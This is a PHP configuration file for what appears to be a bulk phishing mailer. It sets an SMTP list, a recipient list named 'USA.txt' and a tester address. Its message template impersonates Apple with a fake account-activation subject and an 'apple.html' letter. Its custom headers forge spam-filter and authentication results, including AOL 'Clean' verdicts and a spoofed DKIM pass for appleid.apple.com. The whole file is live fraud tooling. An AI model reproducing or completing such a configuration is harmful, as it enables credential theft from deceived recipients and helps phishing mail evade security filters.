<?php

$timeset = 'Asia/Jakarta'; // reference for timezone http://php.net/manual/en/timezones.php


$ghofams_smtp = 'cashcontrols.pxlatelier.com.csv';
$ghofams_list = [
	'file'				=> 'USA.txt',
	'removeduplicate'	=> false,
];


$ghofams_setting = [
	'color'				=> true,
	'max'				=> '1', // total of emails to send per sending
	'delay'				=> '0', // delay for send
	'charset'			=> 'UTF-8',
	'encoding'			=> 'base64', // quoted-printable or base64 or 7bit or 8bit
	'insertemailtest'	=> true, // instert your email at last sending
	'emailtest'			=> 'oneresult01@yahoo.com', // input your email , can be multi emails
	'priority'			=> '1',	// 1=high, 3=normal, 5=low
	'randomparam'		=> true,
	'link'				=> 'https://google.com', // input link here to use a random link fiture
	'header'			=> false,
];

$ghofams_inbox = [
	#--start--#
	[
		'to' 					=> 'service@apple.com', // to
		'fname' 				=> 'Appstore', // from name
		'subject' 				=> "RE: [New Statement Access A New Device] Reminder: Activate your new account.", // subject
		'attachfile'			=> '', // nama file pdf, kalau gak mau attach file, jangan diisi kolomnya
		'attachname' 			=> "", // nama yang diinginkan untuk ganti nama file
		'letter'				=> 'apple.html',

	],
	#--end--#


];

$ghofams_header = array(
	'X-EmailType-Id|##number_normal_3##-##number_normal_6##-##number_normal_10##',
	'X-Attach-Flag|##mix_normal_14##',
	'X-Reference|CloudwebSessionID/F58DDA5C-008D-4AAF-8743-##number_normal_8##',
	'X-TXN_ID|##number_normal_23##-B8C9-4A53-A038-##number_normal_8##',
	'X-Business-Group|Amazon Group',
	'X-Request-UUID|##text_upper_12##-##number_normal_8##-##number_normal_5##',
	'X-DKIM_SIGN_REQUIRED|YES',
	'X-aol-global-disposition|G',
	'X-AOL-VSS-INFO|##mix_normal_23##-##number_normal_8##-##number_normal_26##',
	'X-AOL-VSS-CODE|Clean',
	'X-AOL-SCOLL-AUTHENTICATION|secure1.staff@appleid.apple.com ; domain : email.apple..com DKIM : pass',
	'X-Sender-IP|##number_normal_3##.##number_normal_3##.##number_normal_3##',
);




?>